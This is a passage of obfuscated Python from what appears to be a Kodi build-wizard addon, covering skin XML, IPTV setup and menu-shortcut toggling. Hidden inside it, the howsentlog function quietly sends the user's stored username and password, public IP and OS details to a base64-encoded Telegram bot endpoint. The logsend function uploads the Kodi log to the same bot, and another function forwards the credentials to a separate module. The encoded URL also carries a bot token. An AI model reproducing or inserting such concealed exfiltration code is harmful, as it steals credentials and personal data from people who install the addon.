            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:817
    with open (OOO0OOO0O0O00O0O0 ,'w')as OO0000O0OOOOO0OO0 :#line:820
      OO0000O0OOOOO0OO0 .write (O0000OO000O00OO0O )#line:821
    try :#line:822
      OOOO00OOOOOOO0O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")#line:823
      OO0OO0O000O0O0000 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:824
      copyfile (OOOO00OOOOOOO0O00 ,OO0OO0O000O0O0000 )#line:826
    except :pass #line:827
def testcommand ():#line:828
	O00OO0OOO0O00000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")#line:829
	O00000O000OO0O00O =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:830
	copyfile (O00OO0OOO0O00000O ,O00000O000OO0O00O )#line:832
def autotrakt ():#line:837
    O00000OO0O0O00000 =(ADDON .getSetting ("auto_trk"))#line:838
    if O00000OO0O0O00000 =='true':#line:839
       from resources .libs import trk_aut #line:840
def traktsync ():#line:842
     OOOOOO0OOO0OOO00O =(ADDON .getSetting ("auto_trk"))#line:843
     if OOOOOO0OOO0OOO00O =='true':#line:844
       from resources .libs import trk_aut #line:847
     else :#line:848
        ADDON .openSettings ()#line:849
def imdb_synck ():#line:851
   try :#line:852
     O0OO0O0O00O00O0O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:853
     OO0O00OO00O0000O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:854
     OO000O0OOO00O0O0O =(ADDON .getSetting ("imdb_sync"))#line:855
     O000000OO0O00O00O ="imdb.user"#line:856
     O0OO000OO0O0000O0 ="accounts.informants.imdb.user"#line:857
     O0OO0O0O00O00O0O0 .setSetting (O000000OO0O00O00O ,str (OO000O0OOO00O0O0O ))#line:858
     OO0O00OO00O0000O0 .setSetting ('accounts.informants.imdb.enabled','true')#line:859
     OO0O00OO00O0000O0 .setSetting (O0OO000OO0O0000O0 ,str (OO000O0OOO00O0O0O ))#line:860
   except :pass #line:861
def dis_or_enable_addon (O00OOOOO0O0000OO0 ,OOO00OO00OO00000O ,enable ="true"):#line:863
    import json #line:864
    O0OO0OO0000O0O0O0 ='"%s"'%O00OOOOO0O0000OO0 #line:865
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OOOOO0O0000OO0 )and enable =="true":#line:866
        logging .warning ('already Enabled')#line:867
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00OOOOO0O0000OO0 )#line:868
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OOOOO0O0000OO0 )and enable =="false":#line:869
        return xbmc .log ("### Skipped %s, reason = not installed"%O00OOOOO0O0000OO0 )#line:870
    else :#line:871
        O00OO00O0OOO0OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0OO0OO0000O0O0O0 ,enable )#line:872
        O0O00OO0OO0OOOOO0 =xbmc .executeJSONRPC (O00OO00O0OOO0OOOO )#line:873
        O0O000O00O0000000 =json .loads (O0O00OO0OO0OOOOO0 )#line:874
        if enable =="true":#line:875
            xbmc .log ("### Enabled %s, response = %s"%(O00OOOOO0O0000OO0 ,O0O000O00O0000000 ))#line:876
        else :#line:877
            xbmc .log ("### Disabled %s, response = %s"%(O00OOOOO0O0000OO0 ,O0O000O00O0000000 ))#line:878
    if OOO00OO00OO00000O =='auto':#line:879
     return True #line:880
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:881
def iptvset ():#line:884
  try :#line:885
    O0OO0O000OO00OO0O =(ADDON .getSetting ("iptv_on"))#line:886
    if O0OO0O000OO00OO0O =='true':#line:888
       if KODIV >=17 and KODIV <18 :#line:890
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:891
         O0O0O0O0O00000O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:892
         O0OO0O00OO00OO000 =(ADDON .getSetting ("iptvUrl"))#line:894
         O0O0O0O0O00000O0O .setSetting ('m3uUrl',O0OO0O00OO00OO000 )#line:895
         O00O0OOOOOOO00OOO =(ADDON .getSetting ("epg_Url"))#line:896
         O0O0O0O0O00000O0O .setSetting ('epgUrl',O00O0OOOOOOO00OOO )#line:897
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:900
         iptvsimpldownpc ()#line:901
         wiz .kodi17Fix ()#line:902
         xbmc .sleep (1000 )#line:903
         O0O0O0O0O00000O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:904
         O0OO0O00OO00OO000 =(ADDON .getSetting ("iptvUrl"))#line:905
         O0O0O0O0O00000O0O .setSetting ('m3uUrl',O0OO0O00OO00OO000 )#line:906
         O00O0OOOOOOO00OOO =(ADDON .getSetting ("epg_Url"))#line:907
         O0O0O0O0O00000O0O .setSetting ('epgUrl',O00O0OOOOOOO00OOO )#line:908
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:910
         iptvsimpldown ()#line:911
         wiz .kodi17Fix ()#line:912
         xbmc .sleep (1000 )#line:913
         O0O0O0O0O00000O0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:914
         O0OO0O00OO00OO000 =(ADDON .getSetting ("iptvUrl"))#line:915
         O0O0O0O0O00000O0O .setSetting ('m3uUrl',O0OO0O00OO00OO000 )#line:916
         O00O0OOOOOOO00OOO =(ADDON .getSetting ("epg_Url"))#line:917
         O0O0O0O0O00000O0O .setSetting ('epgUrl',O00O0OOOOOOO00OOO )#line:918
  except :pass #line:919
def howsentlog ():#line:926
       try :#line:928
          import json #line:929
          O0O00000OOO000000 =(ADDON .getSetting ("user"))#line:930
          OOO00O0O0000OO000 =(ADDON .getSetting ("pass"))#line:931
          O0OO0O0O000O0O00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:932
          OOO000O0O0O0O0000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:934
          OOO000O00OOOO000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:935
          OOOO0000OOOOOOOO0 =str (json .loads (OOO000O00OOOO000O )['ip'])#line:936
          OOO0O0000OOO0O000 =O0O00000OOO000000 #line:937
          O000000O00O000OOO =OOO00O0O0000OO000 #line:938
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:939
          xbmc .sleep (1500 )#line:940
          O00O0OO0OO00000OO =xbmc .getInfoLabel ('System.OSVersionInfo')#line:941
          import socket #line:943
          OOO000O00OOOO000O =urllib2 .urlopen (OOO000O0O0O0O0000 .decode ('base64')+' מערכת הפעלה: '+O00O0OO0OO00000OO +' שם משתמש: '+OOO0O0000OOO0O000 +' סיסמה: '+O000000O00O000OOO +' קודי: '+O0OO0O0O000O0O00O +' כתובת: '+OOOO0000OOOOOOOO0 ).readlines ()#line:944
       except :pass #line:946
def googleindicat ():#line:949
			import logg #line:950
			O0OOO00O0O00O0000 =(ADDON .getSetting ("pass"))#line:951
			O0O000O00O0OO000O =(ADDON .getSetting ("user"))#line:952
			logg .logGA (O0OOO00O0O00O0000 ,O0O000O00O0OO000O )#line:953
def logsend ():#line:954
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:955
      OOOOOOO00OOOO0OOO =xbmcgui .DialogBusy ()#line:956
      OOOOOOO00OOOO0OOO .create ()#line:957
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:958
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:959
      howsentlog ()#line:961
      import requests #line:962
      if xbmc .getCondVisibility ('system.platform.windows'):#line:963
         O000OOOOO00O0O000 =xbmc .translatePath ('special://home/kodi.log')#line:964
         OO000000000OO0O00 ={'chat_id':(None ,'-274262389'),'document':(O000OOOOO00O0O000 ,open (O000OOOOO00O0O000 ,'rb')),}#line:968
         OO00000OO0OO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:969
         OO000OOO00OOO0OO0 =requests .post (OO00000OO0OO00OO0 .decode ('base64'),files =OO000000000OO0O00 )#line:971
      elif xbmc .getCondVisibility ('system.platform.android'):#line:972
           O000OOOOO00O0O000 =xbmc .translatePath ('special://temp/kodi.log')#line:973
           OO000000000OO0O00 ={'chat_id':(None ,'-274262389'),'document':(O000OOOOO00O0O000 ,open (O000OOOOO00O0O000 ,'rb')),}#line:977
           OO00000OO0OO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:978
           OO000OOO00OOO0OO0 =requests .post (OO00000OO0OO00OO0 .decode ('base64'),files =OO000000000OO0O00 )#line:980
      else :#line:981
           O000OOOOO00O0O000 =xbmc .translatePath ('special://kodi.log')#line:982
           OO000000000OO0O00 ={'chat_id':(None ,'-274262389'),'document':(O000OOOOO00O0O000 ,open (O000OOOOO00O0O000 ,'rb')),}#line:986
           OO00000OO0OO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:987
           OO000OOO00OOO0OO0 =requests .post (OO00000OO0OO00OO0 .decode ('base64'),files =OO000000000OO0O00 )#line:989
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:990
def rdoff ():#line:992
	O00O0OO000000OO00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1023
	O00OOOOO00OOO0000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1024
	copyfile (O00O0OO000000OO00 ,O00OOOOO00OOO0000 )#line:1025
def skindialogsettind18 ():#line:1026
	try :#line:1027
		OO0O0O000000O00O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1028
		O00OOOOO0OO00OOOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1029
		copyfile (OO0O0O000000O00O0 ,O00OOOOO0OO00OOOO )#line:1030
	except :pass #line:1031
def rdon ():#line:1032
	loginit .loginIt ('restore','all')#line:1033
	OO0000OO00OO0OOOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1035
	O0OO0O00O0OO0O0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1036
	copyfile (OO0000OO00OO0OOOO ,O0OO0O00O0OO0O0O0 )#line:1037
def adults18 ():#line:1039
  O0OOOO00OOOOOO00O =(ADDON .getSetting ("adults"))#line:1040
  if O0OOOO00OOOOOO00O =='true':#line:1041
    O00O00OOO0000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1042
    with open (O00O00OOO0000O0O0 ,'r')as OO0OO0O000O000OO0 :#line:1043
      OO0OO0OOOOOOOOO0O =OO0OO0O000O000OO0 .read ()#line:1044
    OO0OO0OOOOOOOOO0O =OO0OO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1062
    with open (O00O00OOO0000O0O0 ,'w')as OO0OO0O000O000OO0 :#line:1065
      OO0OO0O000O000OO0 .write (OO0OO0OOOOOOOOO0O )#line:1066
def rdbuildaddon ():#line:1067
  O000OOO000O0OOO00 =(ADDON .getSetting ("auto_rd"))#line:1068
  if O000OOO000O0OOO00 =='true':#line:1069
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1070
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1071
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1072
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1090
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1093
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1094
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1098
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1099
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1100
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1118
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1121
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1122
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1126
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1127
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1128
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1146
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1149
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1150
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1154
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1155
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1156
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1174
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1177
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1178
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1181
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1182
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1183
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1201
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1204
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1205
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1207
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1208
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1209
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1227
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1230
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1231
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1233
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1234
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1235
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1253
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1256
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1257
    OO000000OO000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1260
    with open (OO000000OO000O00O ,'r')as OO000O0OOOOO0O0OO :#line:1261
      O0OOO0OO0O000O0O0 =OO000O0OOOOO0O0OO .read ()#line:1262
    O0OOO0OO0O000O0O0 =O0OOO0OO0O000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1280
    with open (OO000000OO000O00O ,'w')as OO000O0OOOOO0O0OO :#line:1283
      OO000O0OOOOO0O0OO .write (O0OOO0OO0O000O0O0 )#line:1284
def rdbuildinstall ():#line:1287
  try :#line:1288
   O000OOOO0OO0O00OO =(ADDON .getSetting ("auto_rd"))#line:1289
   if O000OOOO0OO0O00OO =='true':#line:1290
     OOOO0OO00O000O00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1291
     OO00O0OO0OO000000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1292
     copyfile (OOOO0OO00O000O00O ,OO00O0OO0OO000000 )#line:1293
  except :#line:1294
     pass #line:1295
def rdbuildaddonoff ():#line:1298
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1301
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1302
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1303
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1321
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1324
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1325
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1329
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1330
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1331
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1349
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1352
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1353
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1357
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1358
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1359
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
